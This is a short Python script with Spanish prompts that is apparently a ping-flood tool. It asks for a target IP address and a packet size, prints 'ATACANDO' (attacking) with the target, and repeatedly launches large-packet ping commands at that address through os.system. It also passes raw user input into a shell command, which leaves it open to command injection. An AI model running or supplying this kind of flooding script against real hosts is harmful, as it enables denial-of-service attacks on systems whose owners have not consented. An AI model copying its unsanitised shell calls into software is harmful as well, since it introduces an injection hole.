import os
import platform

SYS=platform.system().lower()

try:
    ip=input("Introduce ip de destino: ")

    while len(ip) < 3 or len(ip) == 0:
        ip=input("Introduce ip de destino: ")

except:
    pass

else:

    while True:
        try:
            pack=int(input("Introduce el tamaño de tu paquete [MAX: 65500]: "))
            
            while pack <= 0 or pack > 65507:
                pack=int(input("[ERROR] Introduce el tamaño de tu paquete [MAX: 65500]: "))
            
            
        except:
            pass
            
        else:
            
            print("ATACANDO => {} CON {}".format(ip,pack))

            if SYS == "windows":
                os.system("ping -l {} -t {}".format(pack,ip))
            else:
                os.system("ping -s {} {}".format(pack,ip))

        